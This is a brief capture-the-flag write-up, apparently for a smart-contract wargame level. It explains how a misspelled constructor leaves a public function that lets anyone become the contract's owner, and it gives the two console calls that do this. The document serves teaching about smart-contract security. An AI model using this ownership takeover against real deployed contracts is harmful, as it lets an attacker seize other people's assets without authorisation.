### Target

1. Take ownership of the contract

### Break Down & Analyze

The constructor has typo: Fal”1”out. Since the wrong spelling, it is served as a function rather than a constructor, so everyone can call it and take the ownership.

### Detailed Steps (work through the console)

```js
await contract.Fal1out() // call the wrong-spelled function to take ownership
await contract.owner() === player // check if you're the owner now
```
